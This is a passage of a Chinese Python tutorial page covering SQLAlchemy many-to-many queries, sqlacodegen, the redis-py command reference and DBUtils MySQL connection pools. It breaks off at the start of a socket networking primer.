    id = Column(Integer, primary_key=True, autoincrement=True)
    name = Column(String(64), unique=True, nullable=False)

engine = create_engine( "mysql+pymysql://webproject:web@192.168.1.18:3306/web?charset=utf8")
Session = sessionmaker(bind=engine)
session = Session()

### 多对多添加
# 添加方式1：同时添加男、女对象,直接添加相亲表;前提是 知道新添加男、女对象的ID;
session.add_all([
    Boy(name='张无忌'),
    Boy(name='宋青书'),
    Girl(name='周芷若'),
    Girl(name='赵敏'),
])
session.commit()

s2g = G2B(girl_id=1, boy_id=1)
session.add(s2g)
session.commit()

# 添加方式2：通过女生对象添加相亲记录表
girl_obj = Girl(name='灭绝师太')                                 # 创建1位女性朋友 灭绝
girl_obj.boys = [Boy(name='张三丰'), Boy(name='方正大师')]        # 然后灭绝和 张三丰、方正大师分别相了1次亲
session.add(girl_obj)
session.commit()

# 添加方式3：通过男生对象添加相亲记录
boy_obj = session.query(Boy).filter(Boy.name=='尹志平').first()  #创建1位男性朋友 尹志平
boy_obj.girls = [Girl(name='小龙女'), Girl(name='黄蓉')]         #然后尹志平 和小龙女、黄蓉分别 相了一次亲
session.add(boy_obj)
session.commit()

### 多对多查询
#boys = relationship('Boy', secondary='g2b', backref='girls')
# 1.基于relationship正向查询
mie_jue = session.query(Girl).filter(Girl.name=='灭绝师太').first()
print( [i.name for i in mie_jue.boys]) #['方正大师', '张三丰']

# 2.基于relationship反向查询
yi_zhi_ping = session.query(Boy).filter(Boy.name=='尹志平').first()
print( [i.name for i in yi_zhi_ping.girls]) #['小龙女', '黄蓉']

</textarea>多对多 关联子查询<textarea>
# 关联子查询
# mysql> select id,name,(select max(id) from girl) as maxgirl from boy;      #SQL子查询
# select id,name,(select avg(score) from 成绩表 where 成绩表.sid =学生表.id ) as avg_socre from 学生表;  # 查询每个学生的平均分

from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, ForeignKey, UniqueConstraint, Index
from sqlalchemy.orm import sessionmaker, relationship
from sqlalchemy import create_engine
from sqlalchemy.sql import text, func
from sqlalchemy.engine.result import ResultProxy
Base = declarative_base()

class Server2Group(Base):
    __tablename__ = 'server2group'
    id = Column(Integer, primary_key=True, autoincrement=True)
    server_id = Column(Integer, ForeignKey('server.id'))
    group_id = Column(Integer, ForeignKey('group.id'))

class Group(Base):
    __tablename__ = 'group'
    id = Column(Integer, primary_key=True)
    name = Column(String(64), unique=True, nullable=False)
    servers = relationship('Server', secondary='server2group', backref='groups')

class Server(Base):
    __tablename__ = 'server'
    id = Column(Integer, primary_key=True, autoincrement=True)
    hostname = Column(String(64), unique=True, nullable=False)

engine = create_engine(
    "mysql+pymysql://webproject:web@192.168.1.18:3306/web?charset=utf8",
    max_overflow=0,  # 超过连接池大小外最多创建的连接
    pool_size=5,  # 连接池大小
    pool_timeout=30,  # 池中没有线程最多等待的时间,否则报错
    pool_recycle=-1  # 多久之后对线程池中的线程进行一次连接的回收(重置)
)

Base.metadata.create_all(engine)

engine = create_engine("mysql+pymysql://root:123@127.0.0.1:3306/s6?charset=utf8", max_overflow=0, pool_size=5)
Session = sessionmaker(bind=engine)
session = Session()

# 关联子查询
subqry = session.query(func.count(Server.id).label("sid")).filter(Server.id == Group.id).correlate(Group).as_scalar()
result = session.query(Group.name, subqry)
"""
SELECT `group`.name AS group_name, (SELECT count(server.id) AS sid
FROM server
WHERE server.id = `group`.id) AS anon_1
FROM `group`
"""

</textarea>

<h4>Python用sqlacodegen将存在的数据库表转化成models.py</h4><pre>
sqlalchemy对数据库表的模型提供了很多易用的方法。为了使用这些内容,需要将数据库表按照sqlalchemy识别的格式创建成Model,但是一般我们都是在已经创建好的数据库环境中开发python代码,对于已经存在的数据库表,可以通过以下方式来生成models.py

pip install sqlacodegen
sqlacodegen--help

sqlacodegen url [opts]
这里的url就是sqlalchemy中create_engine使用的参数,但是当账号密码含有特殊字符时,同样的url在sqlacodegen命令中会报错,识别不出账号、密码、端口等信息,此时可通过给账号和密码加引号解决

opts：
--tables TABLES 指定表,默认将所有表转化成对象
--noindexes 忽略索引
--noviews 忽略视图
--noclasses 不生成类,仅生成表
--outfile OUTFILE 输出文件

sqlacodegen --outfile /rojects/models.py mysql://数据库用户名:数据库用户密码@数据库地址:数据库地址/库名
sqlacodegen --noviews --noconstraints --noclasses --noindexes --outfile 对应py文件路径 url【同create engine处使用的】

</pre><textarea>
#不使用 `--noclasses`导出的对象
from sqlalchemy import BIGINT, Column, DateTime, Float, String, text
from sqlalchemy.dialects.mysql.types import TINYINT
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()
metadata = Base.metadata

class TDeviceActivate(Base):
    __tablename__ = 't_device_activate'

    id = Column(BIGINT(10), nullable=False)
    user_id = Column(BIGINT(10), nullable=False)
    device_id = Column(String(32), primary_key=True, nullable=False)
    mac = Column(String(30))
    uuid = Column(String(32))
    firmware_type = Column(String(16), primary_key=True, nullable=False)
    activate_time = Column(DateTime, nullable=False)
    create_date = Column(DateTime, nullable=False)
    ip_address = Column(String(50))
    longitude = Column(Float(10))
    latitude = Column(Float(10))
    expires_time = Column(DateTime)
    type = Column(TINYINT(10), server_default=text("'1'"))

</textarea><textarea>
#使用 `--noclasses`参数导出的对象
from sqlalchemy import BIGINT, Column, DateTime, Float, MetaData, String, Table, text
from sqlalchemy.dialects.mysql.types import TINYINT
metadata = MetaData()

t_t_device_activate = Table(
    't_device_activate', metadata,
    Column('id', BIGINT(10), nullable=False),
    Column('user_id', BIGINT(10), nullable=False),
    Column('device_id', String(32), primary_key=True, nullable=False),
    Column('mac', String(30)),
    Column('uuid', String(32)),
    Column('firmware_type', String(16), primary_key=True, nullable=False),
    Column('activate_time', DateTime, nullable=False),
    Column('create_date', DateTime, nullable=False),
    Column('ip_address', String(50)),
    Column('longitude', Float(10)),
    Column('latitude', Float(10)),
    Column('expires_time', DateTime),
    Column('type', TINYINT(10), server_default=text("'1'"))
)

</textarea>
</div>

<div id="redis">
<h4>redis</h4><pre>
Redis是基于内存的键值型非关系数据库,存储效率高,支持多种存储数据结构

Redis=Remote DIctionary Server,是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日执行、key-value数据库,并提供多种语言的API。
Redis通常被称为数据结构服务器,因为值(value)可以是字符串(String)、哈希(MAP)、列表(list)、集合(sets)和有序集合(sorted sets)。

安装Redis和redis-py库
pip install redis

redis-py库提供了两个类Redis和StrictRedis来操作redis数据库,StrictRedis实现了大部分官方的命令,参数也一一对应,Redis是StrictRedis的子类,主要是为了向后兼容旧版本的redis-py

from redis import StrictRedis
redis = StrictRedis(host='localhost',port=6379,db=0,password='') # 这四个参数默认分别为localhost, 6379, 0, None
redis.set('name', 'Amy')
r = redis.get('name')
print(type(r), r)   # < class 'bytes'> b'Amy'

import redis
conn = redis.Redis(host='127.0.0.1', port=6379)
# conn = Redis.from_url('redis://@localhost:6379/1')  # 可以使用url方式连接到数据库
conn.set('name', 'LinWOW')
print(conn.get('name'))

使用ConnectionPool来连接
from redis import StrictRedis, ConnectionPool
pool = ConnectionPool(host='localhost',port=6379,db=0,password='')
redis = StrictRedis(connection_pool=pool)
redis.set('name', 'Amy')
print(redis.get('name'))

from redis import Redis,ConnectionPool
POOL = ConnectionPool(host='127.0.0.1',port=6379,max_connections=100)
conn = Redis(connection_pool=POOl)
conn.set('name', 'LinWOW')
print(conn.get('name'))

ConnectionPool也支持使用URL来构建
redis://[:password]@host:port/db    # TCP连接
rediss://[:password]@host:port/db   # Redis TCP+SSL 连接
unix://[:password]@/path/to/socket.sock?db=db    # Redis Unix Socket 连接

from redis import StrictRedis, ConnectionPool
url = 'redis://:xiaoming98@localhost:6379/0'
url2 = 'redis2://:xiaoming98@localhost:6379/0'
pool = ConnectionPool.from_url(url)
redis = StrictRedis(connection_pool=pool)
redis.set('name', 'Amy')
print(redis.get('name'))

【 键key操作 】
exists(name)    判断一个key是否存在
redis.exists('name')    True

delete(name)    删除一个key
redis.delete('name')    1

type(name)  判断key类型
redis.type('name')  b'string'

keys(pattern)   获取所有符合规则的key
redis.keys('n*')    [b'name']

randomkey() 获取随机的一个key
randomkey() b'name'

rename(src, dst)    将key重命名
redis.rename('name', 'nickname')    True

dbsize()    获取当前数据库中key的数目
dbsize()    100

expire(name, time)  设定key的过期时间,单位秒
redis.expire('name', 2) True

ttl(name)   获取key的过期时间,单位秒,-1为永久不过期
redis.ttl('name')   -1

move(name, db)  将key移动到其他数据库
move('name', 2) True

flushdb()   删除当前选择数据库中的所有key
flushdb()   True

flushall()  删除所有数据库中的所有key
flushall()  True

【 字符串string操作 】
set(name, value, ex=None, px=None, nx=False, xx=False)  ex,过期时间(s);px,过期时间(ms);nx,如果设置为True,则只有name不存在时,当前set操作才执行,值存在,就修改不了,执行没效果;xx,如果设置为True,则只有name存在时,当前set操作才执行,值存在才能修改,值不存在,不会设置新值
效果和setex,setnx一致

set(name, value)    给name赋值为value
redis.set('name', 'Bob')    True

get(name)   返回数据库中key为name的string的value
redis.get('name')   b'Bob'

getset(name, value) 给数据库中key为name的string赋予值value并返回上次的value
redis.getset('name', 'Mike')    b'Bob'

mget(keys, *args)   返回多个key对应的value
redis.mget(['name', 'nickname'])    [b'Mike', b'Miker']

setnx(name, value)  如果key不存在才设置value
redis.setnx('newname', 'James') 第一次运行True,第二次False

setex(name, time, value)    设置可以对应的值为string类型的value,并指定此键值对应的有效期
redis.setex('name', 1, 'James') True

setrange(name, offset, value)   设置指定key的value值的子字符串
redis.set('name', 'Hello') redis.setrange('name', 6, 'World')   11,修改后的字符串长度

mset(mapping)   批量赋值
redis.mset({'name1': 'Durant', 'name2': 'James'})   True

msetnx(mapping) key均不存在时才批量赋值
redis.msetnx({'name3': 'Smith', 'name4': 'Curry'})  True

incr(name, amount=1)    key为name的value增值操作,默认1,key不存在则被创建并设为amount
redis.incr('age', 1)    1,即修改后的值

decr(name, amount=1)    key为name的value减值操作,默认1,key不存在则被创建并设置为-amount
redis.decr('age', 1)    -1,即修改后的值

append(key, value)  key为name的string的值附加value
redis.append('nickname', 'OK')  13,即修改后的字符串长度

substr(name, start, end=-1) 返回key为name的string的value的子串
redis.substr('name', 1, 4)  b'ello'

getrange(key, start, end)   获取key的value值从start到end的子字符串
redis.getrange('name', 1, 4)    b'ello'

【 列表list操作 】
rpush(name, *values)    在key为name的list尾添加值为value的元素,可以传多个
redis.rpush('list', 1, 2, 3)    3,list大小

lpush(name, *values)    在key为name的list头添加值为value的元素,可以传多个
redis.lpush('list', 0)  4,list大小

llen(name)  返回key为name的list的长度  redis.llen('list')  4
lrange(name, start, end)    返回key为name的list中start至end之间的元素
redis.lrange('list', 1, 3)  [b'3', b'2', b'1']

ltrim(name, start, end) 截取key为name的list,保留索引为start到end的内容
ltrim('list', 1, 3) True

lindex(name, index) 返回key为name的list中index位置的元素
redis.lindex('list', 1) b'2'

lset(name, index, value)    给key为name的list中index位置的元素赋值,越界则报错
redis.lset('list', 1, 5)    True

lrem(name, count, value)    删除count个key的list中值为value的元素
redis.lrem('list', 2, 3)    1,即删除的个数

lpop(name)  返回并删除key为name的list中的首元素
redis.lpop('list')  b'5'

rpop(name)  返回并删除key为name的list中的尾元素
redis.rpop('list')  b'2'

blpop(keys, timeout=0)  返回并删除名称为在keys中的list中的首元素,如果list为空,则会一直阻塞等待
redis.blpop('list') [b'5']

brpop(keys, timeout=0)  返回并删除key为name的list中的尾元素,如果list为空,则会一直阻塞等待
redis.brpop('list') [b'2']

rpoplpush(src, dst) 返回并删除名称为src的list的尾元素,并将该元素添加到名称为dst的list的头部
redis.rpoplpush('list', 'list2')    b'2'


【 集合set操作 】
sadd(name, *values) 向key为name的set中添加元素
redis.sadd('tags', 'Book', 'Tea', 'Coffee') 3,即插入的数据个数

srem(name, *values) 从key为name的set中删除元素
redis.srem('tags', 'Book')  1,即删除的数据个数

spop(name)  随机返回并删除key为name的set中一个元素
redis.spop('tags')  b'Tea'

smove(src, dst, value)  从src对应的set中移除元素并添加到dst对应的set中
redis.smove('tags', 'tags2', 'Coffee')  True

scard(name) 返回key为name的set的元素个数
redis.scard('tags') 3

sismember(name, value)  测试member是否是key为name的set的元素
redis.sismember('tags', 'Book') True

sinter(keys, *args) 返回所有给定key的set的交集
redis.sinter(['tags', 'tags2']) {b'Coffee'}

sinterstore(dest, keys, *args)  求交集并将交集保存到dest的集合
redis.sinterstore('inttag', ['tags', 'tags2'])  1

sunion(keys, *args) 返回所有给定key的set的并集
redis.sunion(['tags', 'tags2']) {b'Coffee', b'Book', b'Pen'}

sunionstore(dest, keys, *args)  求并集并将并集保存到dest的集合
redis.sunionstore('inttag', ['tags', 'tags2'])  3

sdiff(keys, *args)  返回所有给定key的set的差集
redis.sdiff(['tags', 'tags2'])  {b'Book', b'Pen'}

sdiffstore(dest, keys, *args)   求差集并将差集保存到dest的集合
redis.sdiffstore('inttag', ['tags', 'tags2'])   3

smembers(name)  返回key为name的set的所有元素
redis.smembers('tags')  {b'Pen', b'Book', b'Coffee'}

srandmember(name)   随机返回key为name的set的一个元素,但不删除元素
redis.srandmember('tags')

【 有序集合Sorted Set 】
zadd(name, args, *kwargs)   向key为name的zset中添加元素member,score用于排序。如果该元素存在,则更新其顺序
redis.zadd('grade', 100, 'Bob', 98, 'Mike') 2,即添加的元素个数
redis.zadd('grade', {'Amy': 100, 'Lilei': 97})

zrem(name, *values) 删除key为name的zset中的元素
redis.zrem('grade', 'Mike') 1,即删除的元素个数

zincrby(name, value, amount=1)  如果在key为name的zset中已经存在元素value则该元素的score增加amount,否则向该集合中添加该元素,其score的值为amount
redis.zincrby('grade', 'Bob', -2)   98.0,即修改后的值

zrank(name, value)  返回key为name的zset中元素的排名(按score从小到大排序)即下标
redis.zrank('grade', 'Amy') 1

zrevrank(name, value)   返回key为name的zset中元素的倒数排名(按score从大到小排序)即下标
redis.zrevrank('grade', 'Amy')  2

zrevrange(name, start, end, withscores=False)   返回key为name的zset(按score从大到小排序)中的index从start到end的所有元素
redis.zrevrange('grade', 0, 3)  [b'Bob', b'Mike', b'Amy', b'James']

zrangebyscore(name, min, max, start=None, num=None, withscores=False)   返回key为name的zset中score在给定区间的元素
redis.zrangebyscore('grade', 80, 95)    [b'Amy', b'James']

zcount(name, min, max)  返回key为name的zset中score在给定区间的数量
redis.zcount('grade', 80, 95)   2

zcard(name) 返回key为name的zset的元素个数
redis.zcard('grade')    3

zremrangebyrank(name, min, max) 删除key为name的zset中排名在给定区间的元素
redis.zremrangebyrank('grade', 0, 0)    1,即删除的元素个数

zremrangebyscore(name, min, max)    删除key为name的zset中score在给定区间的元素
redis.zremrangebyscore('grade', 80, 90) 1,即删除的元素个数

【 散列表 Hash操作 】
hset(name, key, value)  向key为name的hash中添加映射
redis.hset('price', 'cake', 5)    1,即添加的映射个数

hsetnx(name, key, value)    向key为name的hash中添加映射,如果映射键名不存在
redis.hsetnx('price', 'book', 6)  1,即添加的映射个数

hget(name, key) 返回key为name的hash中field对应的value
redis.hget('price', 'cake') 5

hmget(name, keys, *args)    返回key为name的hash中各个键对应的value
redis.hmget('price', ['apple', 'orange'])   [b'3', b'7']

hmset(name, mapping)    向key为name的hash中批量添加映射
redis.hmset('price', {'banana': 2, 'pear': 6})  True

hincrby(name, key, amount=1)    将key为name的hash中映射的value增加amount
redis.hincrby('price', 'apple', 3)  6,修改后的值

hexists(name, key)  key为namehash中是否存在键名为key的映射
redis.hexists('price', 'banana')    True

hdel(name, *keys)   key为namehash中删除键名为key的映射
redis.hdel('price', 'banana')   True

hlen(name)  从key为name的hash中获取映射个数
redis.hlen('price') 6

hkeys(name) 从key为name的hash中获取所有映射键名
redis.hkeys('price')    [b'cake', b'book', b'banana', b'pear']

hvals(name) 从key为name的hash中获取所有映射键值
redis.hvals('price')    [b'5', b'6', b'2', b'6']

hgetall(name)   从key为name的hash中获取所有映射键值对
redis.hgetall('price')  {b'cake': b'5', b'book': b'6', b'orange': b'7', b'pear': b'6'}

hscan(name, cursor=0, match=None, count=None)：增量式迭代获取,对于数据大的数据非常有用,hscan可以实现分片的获取数据,并非一次性将数据全部获取完,从而放置内存被撑爆
name参数：redis的name
cursor参数：游标(基于游标分批取获取数据)
match参数：匹配指定key,默认None 表示所有的key
count参数：每次分片最少获取个数,默认None表示采用Redis的默认分片个数
如：
第一次：cursor1, data1 = r.hscan('xx', cursor=0, match=None, count=None)
第二次：cursor2, data1 = r.hscan('xx', cursor=cursor1, match=None, count=None)
...
直到返回值cursor的值为0时,表示数据已经通过分片获取完毕

hscan_iter(name, match=None, count=None)： 利用yield封装hscan创建生成器,实现分批去redis中获取数据
match参数：匹配指定key,默认None 表示所有的key
count参数：每次分片最少获取个数,默认None表示采用Redis的默认分片个数
for item in r.hscan_iter('xx'): print item

</pre>redis blpop实现简单分布式爬虫<textarea>
多个url放到列表里,往里不停放URL,程序循环取值,但是只能一台机器运行取值,可以把url放到redis中,多台机器从redis中取值,爬取数据,实现简单分布式

将多个列表排列,按照从左到右去pop对应列表的元素
参数：
    keys,redis的name的集合
    timeout,超时时间,当元素所有列表的元素获取完之后,阻塞等待列表内有数据的时间(秒), 0 表示永远阻塞
更多：
    r.brpop(keys, timeout),从右向左获取数据

自定义增量迭代：
由于redis类库中没有提供对列表元素的增量迭代,如果想要循环name对应的列表的所有元素,那么就需要：
1、获取name对应的所有列表
2、循环列表
但如果列表非常大,那么就有可能在第一步时就将程序的内容撑爆,所有有必要自定义一个增量迭代的功能：
import redis
conn=redis.Redis(host='127.0.0.1',port=6379)
# conn.lpush('test',*[1,2,3,4,45,5,6,7,7,8,43,5,6,768,89,9,65,4,23,54,6757,8,68])
# conn.flushall()
def scan_list(name,count=2):
    index=0
    while True:
        data_list=conn.lrange(name,index,count+index-1)
        if not data_list:
            return
        index+=count
        for item in data_list:
            yield item
print(conn.lrange('test',0,100))
for item in scan_list('test',5):
    print('---')
    print(item)

</textarea><pre>
管道
redis-py默认在执行每次请求都会创建(连接池申请连接)和断开(归还连接池)一次连接操作,如果想要在一次请求中指定多个命令,则可以使用pipline实现一次请求指定多个命令,并且默认情况下一次pipline 是原子性操作。

</pre><textarea>
import redis
pool = redis.ConnectionPool(host='10.211.55.4', port=6379)
r = redis.Redis(connection_pool=pool)
pipe = r.pipeline(transaction=True)
pipe.multi()
pipe.set('name', 'linwow')
pipe.set('age', '18')
pipe.execute()

</textarea>
</div>

<div id="DBUtils">
<h4>DBUtils</h4><pre>
pip install DBUtils
DBUtils是一套允许线程化Python程序可以安全和有效的访问数据库的模块
DBUtils是一套Python数据库连接池包,并允许对非线程安全的数据库接口进行线程安全包装

python连接数据库时数据连接断开,报错OperationalError: (2006, 'MySQL server has gone away')
1、设置mysql数据的连接时间
在日常的MySQL服务器中,wait-timeout这个参数非常有用。在部分MySQL的默认配置中可能没有wait-timeout这个参数项,在[mysqld]节中加上即可
参数意义：MySQL客户端的数据库连接闲置最大时间值,即某一个MySQL客户端连接过程中闲置的最大时间到达后服务器将其关闭
参数默认值：默认值为8小时 。
MySQL服务器所支撑的最大连接数是有限的,因为每一个连接、第一个表打开的操作都要消耗服务器内存,理想状态是当一个MySQL客户端连接完成工作就自动断开释放内存
如果在配置文件my.cnf中只设置参数wait_timeout=100,则重启服务器后进入,执行:
Mysql> show variables like "%timeout%";
会发现参数设置并未生效,仍然为28800(即默认的8个小时)。
查询资料后,要同时设置interactive_timeout和wait_timeout才会生效。

2、程序设置mysqldb的连接时间
connect_timeout：连接超时的时间,单位秒
conn = MySQLdb.connect(host = '192.168.8.100',user = 'admin',passwd = '',connect_timeout=10)

3、使用mysqldb自带的conn.ping()

4、使用DBUtils建立数据库连接池

DBUtils提供两种外部接口：
PersistentDB ：提供线程专用的数据库连接,并自动管理连接。
PooledDB ：提供线程间可共享的数据库连接,并自动管理连接。

实测证明PersistentDB的速度是最高的,但是在某些特殊情况下,数据库的连接过程可能异常缓慢,而此时的PooledDB则可以提供相对来说平均连接时间比较短的管理方式。
另外实际使用的数据库驱动也有所依赖,比如SQLite数据库只能使用PersistentDB作连接池

</pre><textarea>
import pymysql
from DBUtils.PooledDB import PooledDB
pool = PooledDB(pymysql, host='127.0.0.1',user='admin',passwd='',db='python',port=3306,charset='utf8')
conn = pool.connection()
cur = conn.cursor()
cur.execute('select * from user')
res = cur.fetchall()
print(res)
cur.close()  # or del cur
conn.close()  # or del conn

</textarea><textarea>
# -*- coding: UTF-8 -*-
"""
数据库操作类
1、执行带参数的SQL时,请先用sql语句指定需要输入的条件列表,然后再用tuple/list进行条件批配
２、在格式SQL中不需要使用引号指定数据类型,系统会根据输入参数自动识别
３、在输入的值中不需要使用转意函数,系统会自动处理
"""

import MySQLdb
from MySQLdb.cursors import DictCursor
from DBUtils.PooledDB import PooledDB

class Mysql(object):
    """
    MYSQL数据库对象,负责产生数据库连接 , 此类中的连接采用连接池实现
    获取连接对象：conn = Mysql.getConn()
    释放连接对象：conn.close()或del conn
    """
    #连接池对象
    __pool = None

    def __init__(self):
        # 数据库构造函数,从连接池中取出连接,并生成操作游标
        # self._conn = MySQLdb.connect(host=Config.DBHOST,port=Config.DBPORT,user=Config.DBUSER, passwd=Config.DBPWD,db=Config.DBNAME,use_unicode=False,charset=Config.DBCHAR,cursorclass=DictCursor)
        self._conn = Mysql.__getConn()
        self._cursor = self._conn.cursor()

    @staticmethod
    def __getConn():
        # 静态方法,从连接池中取出连接,return MySQLdb.connection
        if Mysql.__pool is None:
            __pool = PooledDB(creator=MySQLdb, mincached=1 , maxcached=20 ,
                              host=Config.DBHOST , port=Config.DBPORT , user=Config.DBUSER , passwd=Config.DBPWD ,
                              db=Config.DBNAME,use_unicode=False,charset=Config.DBCHAR,cursorclass=DictCursor)
        return __pool.connection()

    def getAll(self,sql,param=None):
        # 执行查询,并取出所有结果集:查询SQL,如果有查询条件,请只指定条件列表,并将条件值使用参数[param]传递进来;num:取得的结果条数,数,条件列表值(元组/列表);return: result list/boolean查询到的结果集
        count = self._cursor.execute(sql) if param is None else self._cursor.execute(sql,param)
        result = self._cursor.fetchall() if count > 0 else False
        return result

    def getOne(self,sql,param=None):
        # 执行查询,并取出第一条;sql:查询SQL,如果有查询条件,请只指定条件列表,并将条件值使用参数[param]传递进来;num:取得的结果条数,数,条件列表值(元组/列表);return: result list/boolean 查询到的结果集
        count = self._cursor.execute(sql) if param is None else self._cursor.execute(sql,param)
        result = self._cursor.fetchone() if count>0 else False
        return result

    def getMany(self,sql,num,param=None):
        # 执行查询,并取出num条结果;sql:查询SQL,如果有查询条件,请只指定条件列表,并将条件值使用参数[param]传递进来;num:取得的结果条数,数,条件列表值(元组/列表);return: result list/boolean 查询到的结果集
        count = self._cursor.execute(sql) if param is None else self._cursor.execute(sql,param)
        result = self._cursor.fetchmany(num) if count>0 else False
        return result

    def insertOne(self,sql,value):
        # 向数据表插入一条记录,value:要插入的记录数据tuple/list
        self._cursor.execute(sql,value)
        return self.__getInsertId()

    def insertMany(self,sql,values):
        # 向数据表插入多条记录,values:要插入的记录数据tuple(tuple)/list[list]
        count = self._cursor.executemany(sql,values)
        return count # 受影响的行数

    def __getInsertId(self):
        # 获取当前连接最后一次插入操作生成的id,如果没有则为０
        self._cursor.execute("SELECT @@IDENTITY AS id")
        result = self._cursor.fetchall()
        return result[0]['id']

    def __query(self,sql,param=None):
        count = self._cursor.execute(sql) if param is None else self._cursor.execute(sql,param)
        return count  # 受影响的行数

    def update(self,sql,param=None):
        return self.__query(sql,param)

    def delete(self,sql,param=None):
        return self.__query(sql,param)

    def begin(self):
        # 开启事务
        self._conn.autocommit(0)

    def end(self,option='commit'):
        # 结束事务
        if option=='commit':
            self._conn.commit()
        else:
            self._conn.rollback()

    def dispose(self,isEnd=1):
        # 释放连接池资源
        if isEnd==1:
            self.end('commit')
        else:
            self.end('rollback');
        self._cursor.close()
        self._conn.close()

</textarea><textarea>
import sys
import os
import pandas as pd
import pymysql
from DBUtils.PooledDB import PooledDB

class OPMysql(object):
    __pool = None

    def __init__(self):
        pass

    def get_mysqlconn(self, host, user, passwd, port, db):
        """构建数据库连接池,return: 数据库连接"""
        if OPMysql.__pool is None:
            __pool = PooledDB(creator=pymysql, mincached=1, maxcached=20,host=host,user=user,passwd=passwd,db=db,port=port,charset='utf8')
            return __pool.connection()

    def dispose(self):
        self.cur.close()
        self.coon.close()

class MysqlHelp(object):
    def __init__(self, host, port, user, passwd, db, charset="utf8"):
        self.host = host
        self.port = port
        self.user = user
        self.passwd = passwd
        self.db = db
        self.charset = charset
        self.db_instance = OPMysql()

    def get_conn(self):
        return self.db_instance.get_mysqlconn(host=self.host,user=self.user,passwd=self.passwd,port=self.port,
        db=self.db)

    def close_conn(self, conn, cursor=None):
        if cursor is not None:
            cursor.close()
            conn.close()
            print('数据库关闭')

    def get_df(self, *args):
        dfs = []
        conn = self.get_conn()
        for i, sql in enumerate(args):
            df = pd.read_sql(sql, conn)    # pandas提供了连接数据库的接口
            dfs.append(df)
        self.close_conn(conn)
        return dfs if len(dfs) > 1 else dfs[0]

config = {
    'host': '127.0.0.1',
    'port': 3306,
    'user': 'admin',
    'passwd': '',
    'db': 'python'
}
mysql_help = MysqlHelp(**config)
sql = 'select * from user'
df = mysql_help.get_df(sql)
print(df.head())  # 读取前五行数据

</textarea><textarea>
import pymysql
from DBUtils.PooledDB import PooledDB

config = dict(
    host="127.0.0.1",
    port=3306,
    db="python",
    user="admin",
    passwd="",
    charset="utf8", #数据库连接编码
    mincached=10, #mincached : 启动时开启的闲置连接数量(缺省值0开始时不创建连接)
    maxcached=10, #maxcached : 连接池中允许的闲置的最多连接数量(缺省值0代表不闲置连接池大小)
    maxshared=20, #maxshared : 共享连接数允许的最大数量(缺省值0代表所有连接都是专用的)如果达到了最大数量,被请求为共享的连接将会被共享使用
    maxconnections=100, #maxconnections : 创建连接池的最大数量(缺省值0代表不限制)
    blocking=True, #blocking : 设置在连接池达到最大数量时的行为(缺省值0或False代表返回一个错误< toMany......>; 其他代表阻塞直到连接数减少,连接被分配)
    maxusage=0, #maxusage : 单个连接的最大允许复用次数(缺省值0或False代表不限制的复用).当达到最大数时,连接会自动重新连接(关闭和重新打开)
    setsession=None, #setsession : 一个可选的SQL命令列表用于准备每个会话,如["set datestyle to german", ...]
)

# PT数据库连接池
class PTConnectionPool(object):
    __pool = None;

    # __enter__,__exit__实现with上下文管理
    def __enter__(self):
        self.conn = self.__getConn();
        self.cursor = self.conn.cursor();
        print(u"PT数据库创建con和cursor")
        return self;

    # @summary: 释放连接池资源
    def __exit__(self, type, value, trace):
        self.cursor.close()
        self.conn.close()
        print(u"PT连接池释放con和cursor")

    def __getConn(self):
        if self.__pool is None:
            self.__pool = PooledDB(
                creator=pymysql, mincached=config.mincached, maxcached=config.maxcached, maxshared=config.maxshared,
                maxconnections=config.maxconnections, blocking=config.blocking, maxusage=config.maxusage,setsession=config.setsession,
                host=config.host, port=config.port, user=config.user, passwd=config.passwd,db=config.db, use_unicode=False, charset=config.charset
            );
        return self.__pool.connection()

    # 从连接池中取出一个连接
    def getconn(self):
        conn = self.__getConn();
        cursor = conn.cursor();
        return cursor,conn


</textarea>
</div>

<div id="socket">
<h3>Python网络编程 socket</h3><pre>
【 计算机网络 】
计算机网络就是把分布在不同地理区域的计算机与专门的外部设备用通信线路互联成一个规模大、功能强的网络系统,从而使众多的计算机可以方便地互相传递信息,共享硬件、软件、数据信息等资源。

计算机网络是现代通信技术与计算机技术相结合的产物,计算机网络可以提供如下一些主要功能:
资源共享。
信息传输与集中处理。
均衡负荷与分布处理。
综合信息服务。

通常计算机网络是按照规模大小和延伸范围来分类的,常见的类型有:局域网(LAN)、城域网(MAN)和广域网(WAN)。Internet 可以被视为世界上最大的广域网

在计算机网络中实现通信必须有一些约定,这些约定被称为通信协议。通信协议负责对传输速率、传输代码、代码结构、传输控制步骤、出错控制等制定处理标准。为了让两个节点能进行对话,必须在它们之间建立通信工具,使彼此之间能进行信息交换。

通信协议通常由三部分组成:
一是语义部分,用于决定双方对话的类型;
二是语法部分,用于决定双方对话的格式;
三是变换规则,用于决定通信双方的应答关系;

国际标准化组织(ISO)于 1978 年提出了"开放系统互连参考模型",即著名的 OSI(Open System Interconnection)参考模型。OSI参考模型力求将网络简化,并以模块化的方式来设计网络。
OSI参考模型把计算机网络分成物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层,受到计算机界和通信业的极大关注。经过十多年的发展和推进,OSI模式已成为各种计算机网络结构的参考标准

通信协议是网络通信的基础,IP 协议则是一种非常重要的通信协议。IP(Internet Protocol)又称网际协议,是支持网间互联的数据报协议。IP协议提供了网间连接的完善功能,包括IP数据报规定的互联网络范围内的地址格式。

经常与IP协议放在一起的还有TCP(Transmission Control Protocol),即传输控制协议,它规定了一种可靠的数据信息传递服务。虽然IP和TCP这两个协议的功能不尽相同,也可以分开单独使用,但它们是在同一个时期作为一个协议来设计的,并且在功能上是互补的,因此,在实际使用中常常把这两个协议统称为TCP/IP协议。

TCP/IP协议最早出现在UNIX操作系统中,现在几乎所有的操作系统都支持TCP/IP协议,因此TCP/IP协议也是Internet中最常用的基础协议。
按照TCP/IP协议模型,网络模型通常被分为四层:应用层、传输层、网络层、网络接口层

【 IP地址和端口号 】
IP地址用于唯一标识网络中的一个通信实体,这个通信实体既可以是一个主机,也可以是一台打印机,或路由器的某一个端口。而在基于IP协议的网络中传输的数据包都必须使用IP地址来进行标识。

在计算机网络中被传输的每一个数据包也要包括一个源IP地址和一个目的IP地址。当该数据包在网络中进行传输时,这两个地址要保持不变,以确保网络设备总能根据确定的IP地址,将数据包从源通信实体送往指定的目的通信实体。

